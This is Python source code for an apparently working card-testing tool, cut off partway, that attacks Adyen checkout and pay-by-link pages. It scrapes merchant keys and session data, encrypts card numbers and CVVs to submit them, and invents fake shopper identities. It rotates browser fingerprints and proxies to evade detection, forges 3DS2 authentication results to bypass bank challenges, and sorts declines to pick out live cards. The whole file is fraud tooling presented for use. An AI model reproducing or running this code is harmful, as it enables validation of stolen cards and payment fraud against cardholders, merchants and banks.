# ═══════════════════════════════════════════════════════════════════════════
#  DELUXE ADYEN BYPASS ENGINE — v9 ARABIC BIDI FIX
#  · Fixed for curl_cffi 0.17.0 (Horus/Alpine compatible)
#  · BiDi Reversed Arabic Interface
# ═══════════════════════════════════════════════════════════════════════════

import os
import re
import sys
import json
import time
import base64
import random
import asyncio
import hashlib
import inspect
import uuid
from datetime import datetime, timezone
from urllib.parse import urljoin, urlencode, parse_qs, urlparse, urlsplit, urlunsplit
from typing import Dict, Optional, List, Any

from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

from curl_cffi.requests import AsyncSession as ChromeSession

CSE_PREFIX = "adyenjs_0_1_25"

IMPERSONATE_POOL = [
    "chrome110", "chrome114", "chrome116", "chrome119", 
    "chrome120", "chrome123", "chrome124", "chrome131",
    "safari15_5", "safari17_0", "edge101"
]

def _random_ua() -> str:
    major = random.randint(120, 131)
    build = random.randint(6000, 6999)
    patch = random.randint(0, 199)
    variants = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36",
    ]
    return random.choice(variants)

def _random_impersonate() -> str:
    return random.choice(IMPERSONATE_POOL)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# ═══════════════════════════════════════════════════════════════════════════
#  PROXY PARSER
# ═══════════════════════════════════════════════════════════════════════════
def parse_proxy(proxy_str: str) -> Optional[dict]:
    if not proxy_str: return None
    s = proxy_str.strip()
    if "://" in s:
        scheme, rest = s.split("://", 1)
    else:
        scheme = "http"
        rest = s

    if "@" in rest:
        auth_part, host_part = rest.rsplit("@", 1)
        host_port = host_part
        user_pass = auth_part
    else:
        parts = rest.split(":")
        if len(parts) == 2:
            host_port = rest
            user_pass = None
        elif len(parts) == 4:
            p1, p2, p3, p4 = parts
            if _is_host_like(p1) and p2.isdigit():
                host_port = f"{p1}:{p2}"
                user_pass = f"{p3}:{p4}"
            elif _is_host_like(p3) and p4.isdigit():
                user_pass = f"{p1}:{p2}"
                host_port = f"{p3}:{p4}"
            else:
                host_port = f"{p1}:{p2}"
                user_pass = f"{p3}:{p4}"
        else:
            return None

    if user_pass:
        user, _, passwd = user_pass.partition(":")
        url = f"{scheme}://{user}:{passwd}@{host_port}"
    else:
        url = f"{scheme}://{host_port}"

    return {"http": url, "https": url, "raw": proxy_str}

def _is_host_like(s: str) -> bool:
    if not s: return False
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', s): return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', s): return True
    return False

# ═══════════════════════════════════════════════════════════════════════════
#  CURL_CFFI 0.17.0 COMPAT HELPERS
# ═══════════════════════════════════════════════════════════════════════════
async def _cc_get(session, url, **kwargs):
    try:
        return await session.get(url, **kwargs)
    except TypeError:
        async with session.get(url, **kwargs) as resp:
            return resp

async def _cc_post(session, url, **kwargs):
    try:
        return await session.post(url, **kwargs)
    except TypeError:
        async with session.post(url, **kwargs) as resp:
            return resp

def _cc_text(resp) -> str:
    if resp is None: return ""
    try:
        t = getattr(resp, "text", "")
        return t if isinstance(t, str) else str(t)
    except: return ""

def _cc_json(resp) -> dict:
    if resp is None: return {}
    try:
        j = getattr(resp, "json", None)
        if callable(j):
            return j()
        return j or {}
    except: return {}

def _cc_status(resp) -> int:
    if resp is None: return 0
    try: return int(getattr(resp, "status_code", 0))
    except: return 0

def _cc_cookies(session) -> str:
    try:
        if session is None: return ""
        cookies = getattr(session, "cookies", None)
        if cookies is None: return ""
        if hasattr(cookies, "get_dict"):
            d = cookies.get_dict() or {}
            return "; ".join(f"{k}={v}" for k, v in d.items())
        return ""
    except: return ""

# ═══════════════════════════════════════════════════════════════════════════
#  ANSI COLORS + LOGGER
# ═══════════════════════════════════════════════════════════════════════════
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"; RED = "\033[91m"
    GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"; MAGENTA = "\033[95m"
    CYAN = "\033[96m"; WHITE = "\033[97m"; GREY = "\033[90m"

def clear(): os.system("clear")
def banner():
    print(f"""{C.MAGENTA}{C.BOLD}
    ╔══════════════════════════════════════════════════════════════════╗
    ║             محرك اختراق Adyen - نسخة هوروس                       ║
    ╚══════════════════════════════════════════════════════════════════╝{C.RESET}
    """)
def hr(char="─", n=68, color=C.GREY): print(f"{color}{char * n}{C.RESET}")
def prompt(txt, color=C.CYAN): return input(f"{color}{C.BOLD}[?]{C.RESET} {txt}")
def log_ok(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def log_err(msg): print(f"{C.RED}[-]{C.RESET} {msg}")
def log_info(msg): print(f"{C.CYAN}[*]{C.RESET} {msg}")
def log_warn(msg): print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def dbg(tag, msg): print(f"{C.DIM}[{tag}]{C.RESET} {msg}")

# ═══════════════════════════════════════════════════════════════════════════
#  CURRENCY / SCA
# ═══════════════════════════════════════════════════════════════════════════
CURRENCY_EXP = {
    'USD': 2, 'EUR': 2, 'GBP': 2, 'AUD': 2, 'CAD': 2, 'CHF': 2,
    'DKK': 2, 'NOK': 2, 'SEK': 2, 'PLN': 2, 'SGD': 2, 'HKD': 2,
    'KWD': 3, 'BHD': 3, 'IQD': 3, 'JOD': 3, 'TND': 3, 'LYD': 3,
    'JPY': 0, 'VND': 0, 'KRW': 0, 'CLP': 0, 'IDR': 0, 'ISK': 0,
}
SCA_LOW_VALUE = {'EUR': 3000, 'GBP': 3000, 'USD': 3000, 'DKK': 22500, 'SEK': 30000, 'NOK': 30000}

def minor_to_major(value: int, currency: str) -> float:
    return value / (10 ** CURRENCY_EXP.get(currency.upper(), 2))

def sca_low_value_exempt(amount_value: int, currency: str) -> bool:
    thr = SCA_LOW_VALUE.get(currency.upper())
    if thr is None: return False
    return int(amount_value) <= thr

# ═══════════════════════════════════════════════════════════════════════════
#  GEO / SHOPPER PROFILES
# ═══════════════════════════════════════════════════════════════════════════
GEO = {
    'US': dict(tz=(-300, -480), lang='en-US', phone='+1',
        first=['James', 'Michael', 'Robert', 'William', 'David', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia'],
        last=['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'],
        cities=[('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
                ('Miami', 'FL', '33101'), ('Seattle', 'WA', '98101'), ('Austin', 'TX', '73301')],
        streets=['Oak Street', 'Maple Ave', 'Washington Blvd', 'Cedar Lane', 'Pine Street', 'Broadway']),
    'GB': dict(tz=(0, 0), lang='en-GB', phone='+44',
        first=['Oliver', 'George', 'Harry', 'Jack', 'Jacob', 'Amelia', 'Olivia', 'Isla', 'Emily', 'Poppy'],
        last=['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies'],
        cities=[('London', 'LND', 'SW1A 1AA'), ('Manchester', 'MAN', 'M1 1AE'), ('Birmingham', 'BIR', 'B1 1AA'),
                ('Leeds', 'LDS', 'LS1 1UR'), ('Glasgow', 'GLA', 'G1 1XW')],
        streets=['High Street', 'Station Road', 'Church Lane', 'Park Road', 'Victoria Street', 'Mill Lane']),
}

class ShopperProfile:
    def __init__(self, country: str = 'US'):
        geo = GEO.get(country.upper(), GEO['US'])
        self.country = country.upper()
        self._geo = geo
        self.first = random.choice(geo['first'])
        self.last = random.choice(geo['last'])
        self.full_name = f"{self.first} {self.last}"
        self.email = f"{self.first.lower()}.{self.last.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'proton.me'])}"
        self.phone = geo['phone'] + ''.join(str(random.randint(0, 9)) for _ in range(9))
        self.city, self.state, self.zip = random.choice(geo['cities'])
        self.house_number = str(random.randint(10, 9999))
        self.street = f"{self.house_number} {random.choice(geo['streets'])}"
        tz_a, tz_b = geo['tz']
        self.tz_offset = random.choice(range(min(tz_a, tz_b), max(tz_a, tz_b) + 1, 60))

    @property
    def language(self) -> str: return self._geo['lang']

    def billing_address(self) -> dict:
        return {"city": self.city, "country": self.country, "houseNumberOrName": self.house_number,
            "postalCode": self.zip, "stateOrProvince": self.state, "street": self.street}

    def as_payment_fields(self) -> dict:
        return {"shopperEmail": self.email, "shopperName": {"firstName": self.first, "lastName": self.last},
            "telephoneNumber": self.phone, "billingAddress": self.billing_address(), "deliveryAddress": self.billing_address()}

def build_browser_info(profile: Optional[ShopperProfile] = None, ua: Optional[str] = None) -> dict:
    p = profile or ShopperProfile('US')
    return {"acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "colorDepth": random.choice([24, 24, 24, 30]), "language": p.language, "javaEnabled": False,
        "screenHeight": random.choice([1080, 1440, 900, 1200]), "screenWidth": random.choice([1920, 2560, 1440, 1680]),
        "timeZoneOffset": p.tz_offset, "userAgent": ua or UA}

def extract_stored_ref(response: dict) -> Optional[str]:
    add = response.get('additionalData') or {}
    if isinstance(add, dict):
        for k in ('recurring.recurringDetailReference', 'recurringDetailReference', 'recurring.recurringReference', 'recurringReference'):
            if add.get(k): return add[k]
    if response.get('storedPaymentMethodId'): return response['storedPaymentMethodId']
    if response.get('recurringDetailReference'): return response['recurringDetailReference']
    return None

def attempt_delay(attempt: int, base: float = 3.0, jitter: float = 1.5) -> float:
    return base + random.random() * jitter

# ═══════════════════════════════════════════════════════════════════════════
#  3DS2 BYPASS
# ═══════════════════════════════════════════════════════════════════════════
def _b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return base64.b64decode(s)

def _b64url_encode(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

def _std_b64(data: bytes) -> str:
    return base64.b64encode(data).decode()

def decode_action_token(action: dict) -> Optional[dict]:
    token_raw = action.get('token', '')
    if not token_raw: return None
    for dec in (_b64url_decode, lambda s: base64.b64decode(s + '=='), lambda s: base64.b64decode(s + '=' * (-len(s) % 4))):
        try: return json.loads(dec(token_raw))
        except: continue
    return None

def forge_fingerprint(server_trans_id: str) -> str:
    obj = {"threeDSCompInd": "Y", "threeDSServerTransID": server_trans_id}
    return _std_b64(json.dumps(obj).encode())

def forge_challenge_v2(server_trans_id: str, directory_server_id: str = "A000000004", message_version: str = "2.2.0") -> str:
    obj = {"transStatus": "Y", "authorisationToken": _std_b64(b"Y"), "threeDSServerTransID": server_trans_id,
        "directoryServerId": directory_server_id, "messageVersion": message_version, "status": "COMPLETED", "challengeCompletionInd": "Y"}
    return _std_b64(json.dumps(obj).encode())

async def _real_fingerprint_3ds2(session, action, sid, sdata, ck, env, adyen_base):
    tok = decode_action_token(action)
    if not tok: return None
    method_url = tok.get('threeDSMethodUrl', '')
    server_tid = tok.get('threeDSServerTransID', '')
    notify_url = tok.get('threeDSMethodNotificationURL', '')
    if not method_url or not server_tid: return None

    method_data_obj = {"threeDSServerTransID": server_tid, "threeDSMethodNotificationURL": notify_url or f"{adyen_base}/threeDSMethodNotification.shtml"}
    method_data_b64 = _b64url_encode(json.dumps(method_data_obj).encode())
    try:
        parsed = urlparse(method_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        r = await _cc_post(session, method_url, data=urlencode({"threeDSMethodData": method_data_b64}),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,*/*", "User-Agent": UA, "Origin": origin, "Referer": origin + "/"}, timeout=15)
        dbg("DBG 3DS", f"method POST status={_cc_status(r)}")
    except Exception as e:
        dbg("DBG 3DS", f"method POST exception: {str(e)[:80]}")
    return {"threeds2.fingerprint": forge_fingerprint(server_tid)}

async def _real_challenge_3ds2(session, action, sid, sdata, ck, env, submit_details):
    tok = decode_action_token(action) or {}
    acs_url = tok.get('acsURL', '')
    if not acs_url: return None

    creq_obj = {"messageType": "CReq", "messageVersion": tok.get('messageVersion', '2.1.0'), "threeDSServerTransID": tok.get('threeDSServerTransID', ''),
        "acsTransID": tok.get('acsTransID', ''), "challengeWindowSize": "05", "threeDSRequestorAppURL": tok.get('threeDSRequestorAppURL', '')}
    creq_b64 = _b64url_encode(json.dumps(creq_obj).encode())
    cres_b64 = None
    try:
        r = await _cc_post(session, acs_url, data=urlencode({"CReq": creq_b64}),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,*/*", "User-Agent": UA}, timeout=15)
        body = _cc_text(r)
        m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
        if m: cres_b64 = m.group(1)
        else:
            m = re.search(r'"CRes"\s*:\s*"([^"]+)"', body, re.I)
            if m: cres_b64 = m.group(1)
        dbg("DBG 3DS", f"challenge POST status={_cc_status(r)} cres={bool(cres_b64)}")
    except Exception as e:
        dbg("DBG 3DS", f"challenge POST exception: {str(e)[:80]}")
        return None
    if not cres_b64: return None
    cres_json = None
    try: cres_json = json.loads(_b64url_decode(cres_b64))
    except: pass

    obj = {"transStatus": (cres_json or {}).get('transStatus', 'Y')}
    auth_tok = (cres_json or {}).get('authorisationToken')
    if auth_tok: obj["authorisationToken"] = auth_tok
    details = {"threeds2.challengeResult": _std_b64(json.dumps(obj).encode())}
    return await submit_details(session, sid, sdata, ck, env, details)

async def bypass_pipeline(session, data: dict, sid: str, sdata: str, ck: str, env: str, submit_details, adyen_base: str, touch_acs: bool = False, depth: int = 0) -> dict:
    if depth > 3: return data
    action = data.get('action')
    if not isinstance(action, dict): return data
    rc = data.get('resultCode', '')
    act_type = action.get('type', '')
    subtype = action.get('subtype', '')
    new_sdata = data.get('sessionData', sdata)
    tok = decode_action_token(action)
    server_tid = (tok or {}).get('threeDSServerTransID', '')
    dbg("DBG 3DS", f"rc={rc} type={act_type} subtype={subtype} tid={server_tid[:20]}... depth={depth}")
    details = None

    if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
        details = await _real_fingerprint_3ds2(session, action, sid, new_sdata, ck, env, adyen_base)
    elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
        if touch_acs:
            result = await _real_challenge_3ds2(session, action, sid, new_sdata, ck, env, submit_details)
            if result is not None:
                new_rc = result.get('resultCode', '')
                if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'): return result
        if server_tid: details = {"threeds2.challengeResult": forge_challenge_v2(server_tid)}

    if details:
        dbg("DBG 3DS", f"submitting details: {list(details.keys())}")
        result = await submit_details(session, sid, new_sdata, ck, env, details)
        new_rc = result.get('resultCode', '')
        dbg("DBG 3DS", f"submit rc={new_rc}")
        if new_rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'): return result
        if new_rc in ('IdentifyShopper', 'ChallengeShopper'):
            return await bypass_pipeline(session, result, sid, result.get('sessionData', new_sdata), ck, env, submit_details, adyen_base, touch_acs, depth + 1)
        return result
    return data

# ═══════════════════════════════════════════════════════════════════════════
#  FINGERPRINT PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════
_FP_HASH_ALPHABET = "0123456789abcdef"
def _rand_hash32() -> str: return "".join(random.choices(_FP_HASH_ALPHABET, k=32))

def build_browser_fingerprint_payloads(profile: ShopperProfile, ua: str = UA) -> Dict[str, Any]:
    sw = random.choice([1920, 2560, 1440, 1680, 1536])
    sh = random.choice([1080, 1440, 900, 1200, 864])
    aw = sw
    ah = sh - 40
    lt = profile.language
    h1 = _rand_hash32(); h1s = _rand_hash32(); h2 = _rand_hash32()

    v1_components = {"user_agent": ua, "language": lt, "resolution": [sw, sh], "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset, "navigator_platform": "Win32", "adblock": False, "touch_support": [1, True, True]}
    v1s_components = {"language": lt, "resolution": [sw, sh], "available_resolution": [aw, ah],
        "timezone_offset": profile.tz_offset, "navigator_platform": "Win32", "adblock": False, "touch_support": [1, True, True]}
    v2_components = {"languages": [[lt]], "device_memory": random.choice([8, 16]), "screen_resolution": [sh, sw],
        "hardware_concurrency": random.choice([8, 12, 16]), "timezone": "UTC", "indexed_db": True, "platform": "Win32",
        "color_gamut": "srgb", "forced_colors": False, "monochrome": 0, "contrast": 0, "reduced_motion": False, "hdr": False}

    return {
        "browser_fingerprint_by_version": [
            {"payload_json": json.dumps({"components": v1_components, "fingerprint": h1}), "payload_type": "fingerprint-v1"},
            {"payload_json": json.dumps({"components": v1s_components, "fingerprint": h1s}), "payload_type": "fingerprint-v1-sans-ua"},
            {"payload_json": json.dumps({"components": v2_components, "fingerprint": h2}), "payload_type": "fingerprint-v2"},
        ],
        "browser_profile": {"components": json.dumps(v1_components), "fingerprint": h1,
            "timezone": str(profile.tz_offset), "user_agent": ua, "website_url": "https://checkoutshopper-live.adyen.com/"},
    }

# ═══════════════════════════════════════════════════════════════════════════
#  ADYEN CSE
# ═══════════════════════════════════════════════════════════════════════════
class AdyenCSE:
    def __init__(self, public_key_str: str):
        parts = public_key_str.split("|")
        if len(parts) != 2: raise ValueError(f"Bad pubkey format: {public_key_str[:30]}")
        self._exp = int(parts[0], 16)
        self._mod = int(parts[1], 16)
        nums = RSAPublicNumbers(self._exp, self._mod)
        self._pub = nums.public_key(default_backend())

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _encrypt_field_jwe(self, field_name: str, field_value: str) -> str:
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        payload = json.dumps({field_name: field_value, "generationtime": ts}).encode()
        header_b64 = self._b64url(b'{"cty":"application/json","alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
        cek = os.urandom(32)
        enc_cek = self._pub.encrypt(cek, OAEP(mgf=MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None))
        iv = os.urandom(12)
        ct_tag = AESGCM(cek).encrypt(iv, payload, header_b64.encode())
        ct, tag = ct_tag[:-16], ct_tag[-16:]
        return ".".join([header_b64, self._b64url(enc_cek), self._b64url(iv), self._b64url(ct), self._b64url(tag)])

    def _encrypt_field(self, field_name: str, field_value: str) -> str:
        gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        plain = f"{field_name}:{field_value}\ngenerationtime:{gen}"
        plain_b = plain.encode()
        aes_key = os.urandom(32)
        nonce = os.urandom(12)
        ct_tag = AESCCM(aes_key, tag_length=8).encrypt(nonce, plain_b, None)
        enc_key = self._pub.encrypt(aes_key, PKCS1v15())
        blob = enc_key + nonce + ct_tag
        return f"{CSE_PREFIX}${base64.b64encode(blob).decode()}"

    def encrypt_card(self, number: str, month: str, year: str, cvv: str, use_jwe: bool = False) -> dict:
        yr = year if len(year) == 4 else f"20{year}"
        fn = self._encrypt_field_jwe if use_jwe else self._encrypt_field
        return {"encryptedCardNumber": fn("number", number), "encryptedExpiryMonth": fn("expiryMonth", month.zfill(2)),
            "encryptedExpiryYear": fn("expiryYear", yr), "encryptedSecurityCode": fn("cvc", cvv)}

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG SCRAPER
# ═══════════════════════════════════════════════════════════════════════════
_CK = [r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)', r'data-client-key=["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)']
_SI = [r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{15,})"', r"'sessionId'\s*:\s*'([A-Za-z0-9_-]{15,})'", r'sessionId["\'\s:=]+["\']?([A-Za-z0-9_-]{15,})']
_SD = [r'"sessionData"\s*:\s*"([^"]{40,})"', r"'sessionData'\s*:\s*'([^']{40,})'", r'sessionData["\'\s:=]+["\']?([^"\'\s,}{]+)']
_PK = [r'"publicKey"\s*:\s*"([0-9a-fA-F]+\|[0-9a-fA-F]+)"', r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'", r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)']
_LI = [r'"linkId"\s*:\s*"([A-Za-z0-9]+)"', r"'linkId'\s*:\s*'([A-Za-z0-9]+)'", r'linkId["\s:\'=]+["\']?([A-Za-z0-9]{20,})', r'adyen\.link/([A-Za-z0-9]{20,})']
_LC = [r'"loadingContext"\s*:\s*"([^"]+)"', r"'loadingContext'\s*:\s*'([^']+)'"]
_ADYEN_SIGNALS = ['adyen.com', 'adyen.link', 'AdyenCheckout', 'adyen-checkout', 'adyenjs', 'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted', 'paybylink']

def _first_match(patterns, text):
    for p in patterns:
        m = re.search(p, text)
        if m: return m.group(1)
    return None

def _extract_config(html: str) -> dict:
    cfg = dict(clientKey=None, sessionId=None, sessionData=None, publicKey=None, environment=None, adyen=False, linkId=None, loadingContext=None)
    low = html.lower()
    for sig in _ADYEN_SIGNALS:
        if sig.lower() in low: cfg['adyen'] = True; break
    cfg['clientKey'] = _first_match(_CK, html)
    cfg['sessionId'] = _first_match(_SI, html)
    sd_raw = _first_match(_SD, html)
    if sd_raw: cfg['sessionData'] = sd_raw.replace(r'\/', '/').replace('\\/', '/')
    cfg['publicKey'] = _first_match(_PK, html)
    cfg['linkId'] = _first_match(_LI, html)
    cfg['loadingContext'] = _first_match(_LC, html)
    if cfg['clientKey']: cfg['environment'] = 'live' if cfg['clientKey'].startswith('live_') else 'test'
    return cfg

def _merge(dst, src):
    for k in ('clientKey', 'publicKey', 'environment', 'linkId', 'loadingContext'):
        if src.get(k) and not dst.get(k): dst[k] = src[k]
    for k in ('sessionId', 'sessionData'):
        if src.get(k): dst[k] = src[k]
    for k in ('checkoutAttemptId', 'use_jwe', 'is_pbl', 'pbl_status', 'pbl_base', 'amount_value', 'amount_currency', 'pbl_reference', 'returnUrl', 'shopperLocale', 'countryCode'):
        if src.get(k) is not None: dst[k] = src[k]
    if src.get('adyen'): dst['adyen'] = True

def _generate_random_shopper(country_code: str = 'US') -> dict:
    FIRST = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
    LAST = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
    first = random.choice(FIRST); last = random.choice(LAST); num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    phone = f"+1{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
    CITIES_ZIP = [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'), ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'), ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301')]
    city, state, zip_code = random.choice(CITIES_ZIP)
    house_num = str(random.randint(10, 9999))
    street = f"{house_num} {random.choice(STREETS)}"
    return {'first_name': first, 'last_name': last, 'full_name': f"{first} {last}", 'email': email, 'phone': phone, 'street': street, 'house_number': house_num, 'city': city, 'state': state, 'postal_code': zip_code, 'country': country_code or 'US'}

# ═══════════════════════════════════════════════════════════════════════════
#  MAIN ADYEN ENGINE
# ═══════════════════════════════════════════════════════════════════════════
class AdyenHitter:
    DECLINE_MAP = {
        "Refused": "refused", "Declined": "declined", "Not enough balance": "insufficient_funds", "Insufficient Funds": "insufficient_funds",
        "Expired Card": "expired_card", "Invalid Card Number": "invalid_number", "CVC Declined": "incorrect_cvc", "Invalid CVC": "incorrect_cvc",
        "Restricted Card": "restricted_card", "3d-secure": "3ds_required", "Blocked Card": "blocked_card", "Acquirer Fraud": "fraud",
        "Issuer Suspected Fraud": "fraud_suspected", "Not Permitted": "not_permitted", "Revocation Of Auth": "revoked", "Pin validation not possible": "pin_error",
        "Referral": "referral", "Shopper Cancelled": "cancelled", "Invalid Pin": "invalid_pin", "Pin tries exceeded": "pin_exceeded", "Withdrawal amount exceeded": "limit_exceeded",
        "Issuer Unavailable": "issuer_unavailable", "Not Submitted": "not_submitted",
    }
    REFUSAL_CODE_MAP = {"2": "insufficient_funds", "3": "referral", "5": "blocked_card", "6": "expired_card", "8": "invalid_number", "10": "incorrect_cvc",
        "12": "not_permitted", "14": "invalid_expiry", "15": "revoked", "17": "declined", "18": "fraud", "21": "issuer_unavailable"}
    LIVE_DECLINE = {'insufficient_funds', 'incorrect_cvc', '3ds_required', 'challenge_required', 'pin_error', 'invalid_pin', 'pin_exceeded', 'limit_exceeded',
        'not_permitted', 'restricted_card', 'referral', 'issuer_unavailable'}

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")): self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None
        self._cached_pk: Optional[str] = None
        self._last_sid: Optional[str] = None
        self._sid_history: List[str] = []
        self._setup_count = 0
        self.proxy_str = proxy_data.get("raw") if proxy_data else None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc: return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        if 'adyen.link' in self.url: return "https://eu.adyen.link"
        return self.url

    def _adyen_base(self, env: str) -> str:
        return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"

    def _proxy_config(self) -> Optional[dict]:
        if not self.proxy_data: return None
        return {"http": self.proxy_data.get("http"), "https": self.proxy_data.get("https")}

    async def _bootstrap_pbl(self, session, link_id: str, loading_ctx: str, env: str, ua: str = UA, max_retries: int = 3) -> dict:
        self._setup_count += 1
        base = loading_ctx.rstrip('/')
        setup_url = (f"{base}/session/paybylink/v1/{link_id}/setup?generateCheckoutAttemptId=true&openedFromEmail=false&generateSessionData=true&iframe=false&d={link_id}")
        origin = self._get_origin()
        cookie_hdr = _cc_cookies(session)
        hdr = {"Accept": "application/json", "User-Agent": ua, "Origin": origin, "Referer": self.url, "Cache-Control": "no-cache", "Pragma": "no-cache"}
        if cookie_hdr: hdr["Cookie"] = cookie_hdr

        out = {}
        for retry in range(max_retries):
            try:
                r = await _cc_get(session, setup_url, headers=hdr, timeout=12)
                status = _cc_status(r)
                raw_body = _cc_text(r)
                d = _cc_json(r)
                sid_full = d.get('sessionId') or ''
                sid_show = sid_full[:20] if sid_full else 'NONE'
                sdata_len = len(d.get('sessionData') or '')
                ck_show = (d.get('dropinConfiguration', {}).get('clientKey') or 'NONE')[:24]
                same_sid = (sid_full == self._last_sid) if self._last_sid else False
                dbg("DBG PBL", f"call#{self._setup_count} retry={retry} status={status}")
                dbg("DBG PBL", f"  sid={sid_show}... same_as_prev={same_sid}")
                dbg("DBG PBL", f"  sdata_len={sdata_len} ck={ck_show}...")
                if status != 200 or not sid_full: dbg("DBG PBL", f"  body[:200]={raw_body[:200]}")
                if sid_full: self._sid_history.append(sid_full[:20]); self._last_sid = sid_full

                if status == 200 and isinstance(d, dict) and sid_full:
                    out['setup_status'] = status
                    out['sessionId'] = d.get('sessionId')
                    out['sessionData'] = d.get('sessionData')
                    dc = d.get('dropinConfiguration', {}) or {}
                    out['clientKey'] = dc.get('clientKey')
                    out['environment'] = dc.get('environment', env)
                    out['checkoutAttemptId'] = dc.get('checkoutAttemptId')
                    pl = d.get('paymentLink', {}) or {}
                    if pl.get('amount'):
                        amt = pl['amount']
                        amt_val = amt.get('value')
                        if amt_val is not None:
                            try: out['amount_value'] = int(amt_val)
                            except: out['amount_value'] = amt_val
                        out['amount_currency'] = amt.get('currency', 'USD')
                    out['pbl_status'] = pl.get('status')
                    out['pbl_reference'] = pl.get('reference')
                    out['pbl_reusable'] = pl.get('reusable', True)
                    out['countryCode'] = pl.get('countryCode')
                    out['returnUrl'] = pl.get('returnUrl')
                    out['shopperLocale'] = pl.get('shopperLocale')
                    th = d.get('theme', {}) or {}
                    if th.get('displayName'): out['merchant'] = th['displayName']
                    out['adyen'] = True; out['is_pbl'] = True; out['linkId'] = link_id; out['pbl_base'] = base; out['use_jwe'] = True
                    return out
                elif status == 403:
                    if retry < max_retries - 1: await asyncio.sleep(0.5); continue
                    return {'error': 'rate_limited', 'setup_status': 403}
                elif status == 410: return {'error': 'link_expired', 'setup_status': 410}
